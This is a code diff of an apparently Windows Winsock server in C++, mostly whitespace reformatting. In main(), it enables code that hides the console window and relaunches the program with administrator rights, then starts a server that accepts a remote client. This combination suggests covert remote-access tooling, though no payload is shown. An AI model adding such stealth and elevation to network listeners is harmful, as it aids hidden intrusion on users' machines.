@@ -13,48 +13,47 @@
 #include "syscalls.h"
 #include "socket.h"
 
- // Request
+// Request
 
 static void startServer()
 {
-    WSADATA wsaData;
-    SOCKET ListenSocket = INVALID_SOCKET, ClientSocket = INVALID_SOCKET;
-    struct addrinfo* result = NULL;
+	WSADATA wsaData;
+	SOCKET ListenSocket = INVALID_SOCKET, ClientSocket = INVALID_SOCKET;
+	struct addrinfo* result = NULL;
 
-    // Initialize Winsock
-    if (!initializeWinsock(wsaData)) return;
+	// Initialize Winsock
+	if (!initializeWinsock(wsaData)) return;
 
-    // Resolve server address and bind socket
-    if (!setupSocket(ListenSocket, result)) return;
+	// Resolve server address and bind socket
+	if (!setupSocket(ListenSocket, result)) return;
 
-    // Print listening info
-    printListeningInfo(ListenSocket);
+	// Print listening info
+	printListeningInfo(ListenSocket);
 
-    // Accept a client connection
-    ClientSocket = acceptClient(ListenSocket);
-    if (ClientSocket == INVALID_SOCKET) return;
+	// Accept a client connection
+	ClientSocket = acceptClient(ListenSocket);
+	if (ClientSocket == INVALID_SOCKET) return;
 
-    // Close the listening socket as it's no longer needed
-    closesocket(ListenSocket);
+	// Close the listening socket as it's no longer needed
+	closesocket(ListenSocket);
 
-    // Handle client communication
-    handleClient(ClientSocket);
+	// Handle client communication
+	handleClient(ClientSocket);
 
-    // Cleanup resources
-    cleanup(ClientSocket);
+	// Cleanup resources
+	cleanup(ClientSocket);
 }
 
 int main()
 {
 	// Hide console window
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
-	//// Comment to debug
-	//if (!isElevated()) {
-	//	// Request for elevation
-	//	restartAsAdmin();
-	//	return 0;
-	//}
-
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	// Comment to debug
+	if (!isElevated()) {
+		// Request for elevation
+		restartAsAdmin();
+		return 0;
+	}
 
 	std::cout << "Server started." << std::endl;
 	try {
